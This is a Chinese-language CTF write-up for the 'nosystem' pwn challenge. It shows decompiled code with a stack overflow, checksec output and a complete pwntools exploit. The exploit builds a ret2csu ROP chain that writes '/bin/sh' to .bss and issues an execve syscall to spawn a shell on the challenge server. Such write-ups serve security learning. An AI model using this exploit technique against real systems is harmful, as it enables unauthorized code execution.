---
layout: post
title: "nosystem"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for nosystem from furry (2026)."
source_folder: "Write-ups/2026/furry/nosystem"
lang: zh-CN
---
{% raw %}
# ELF
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[64]; // [rsp+0h] [rbp-40h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("Hey, my boss told me do NOT write variables outside the function. zwz");
  puts("SO I write an array outside haha~ nwn");
  puts("Don't you think so?");
  __isoc99_scanf("%[^\n]%*c", v4);
  puts("Oh, maybe you're looking for some secrets, but actually,nothing.");
  printf("Maybe you're looking for system() or /bin/sh?");
  return 0;
}
```

```
(venv)  ✘ qwer@qwer  ~/pwn  checksec /home/qwer/pwn/challenge/furry2026/nosystem/nosystem
[*] '/home/qwer/pwn/challenge/furry2026/nosystem/nosystem'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
# 思路
啥保护都没开，一个脸上的栈溢出，原elf直接给了一个csu。
构造rop时发现没有‘sh’，通过csu写一个，之后构造rop链就行。

exp：
```python
from pwncli import *
import sys

context(arch="amd64", os="linux", endian="little")
context.terminal = ["tilix", "--action=session-add-right", "-e"]

file = "/home/qwer/pwn/nosystem"
host = "ctf.furryctf.com"
port = 34553
p = ELF(file)
libc = ELF.libc

if "r" in sys.argv:
    io = remote(host, port)
    log.success("运行模式: 远程 (Remote)")
else:
    io = process(file)
    log.success("运行模式: 本地 (Local)")

if "d" in sys.argv:
    context.log_level = "debug"
    log.success("Debug: 开启 (Debug On)")


def dbg(cmd=""):
    if "r" in sys.argv or "na" in sys.argv:
        log.success("pwndbg连接关闭 (Pwndbg Disabled)")
        return
    else:
        gdb.attach(io, gdbscript=cmd)
        log.success("pwndbg已连接 (Pwndbg Attached)")
        pause()


s = lambda data: io.send(data)
sl = lambda data: io.sendline(data)
sa = lambda x, data: io.sendafter(x, data)
sla = lambda x, data: io.sendlineafter(x, data)
r = lambda num=4096: io.recv(num)
rn = lambda num: io.recvn(num)
rl = lambda num=4096: io.recvline(num)
ru = lambda x: io.recvuntil(x)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
num2str = lambda x: str(x).encode()
# addr为next处地址
protect_ptr = lambda addr, addr2: (addr >> 3 * 4) ^ addr2
reveal_ptr = lambda addr, next: protect_ptr(addr, next)

look = lambda n: print(
    f"🔍\x1b[97mLOOK\x1b[0m \x1b[96m{n}\x1b[0m \x1b[97m =➤ \x1b[0m \x1b[1;94m{hex(eval(n, globals()))}\x1b[0m"
)


def analy_data(data):
    log.info("==== data analy ====")
    for i in range(0, len(data), 16):
        line = data[i : i + 16]
        hexpart = " ".join(f"{b:02x}" for b in line)
        strpart = "".join(chr(b) if 32 <= b < 127 else "." for b in line)
        print(f"{i:08x}  {hexpart:<48}  {strpart}")


junk = b"a" * 64 + b"b" * 0x8
pop_gadget = 0x40134A  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_caller = 0x401330
mov_rax_rdx = 0x40116E  # mov rax, r14; mov rdx, r15; ret
syscall_addr = 0x401231
pop_r14_r15 = 0x401350
mov_edi_jmp = 0x401109
pop_rsi = 0x401351

format_str_addr = 0x4020A2
bss_addr = 0x404048
scanf_got = 0x404030
ret = 0x401354

payload = p64(ret)
payload += p64(pop_gadget)
payload += p64(0)  # rbx = 0
payload += p64(1)  # rbp = 1
payload += p64(format_str_addr)  # r12 = rd
payload += p64(bss_addr)  # r13 = rsi
payload += p64(0)  # r14 = rdx
payload += p64(scanf_got)  # r15
payload += p64(csu_caller)

payload += p64(0) * 7


payload += p64(pop_r14_r15)
payload += p64(pop_r14_r15)
payload += p64(0)
payload += p64(mov_rax_rdx)
payload += p64(mov_edi_jmp)
payload += p64(59)
payload += p64(0)
payload += p64(mov_rax_rdx)
payload += p64(pop_rsi)
payload += p64(0) * 2
payload += p64(syscall_addr)
dbg()

sla("Don't you think so?", junk + payload)
sleep(0.1)
sl(b"/bin/sh\x00")
io.interactive()

```

{% endraw %}
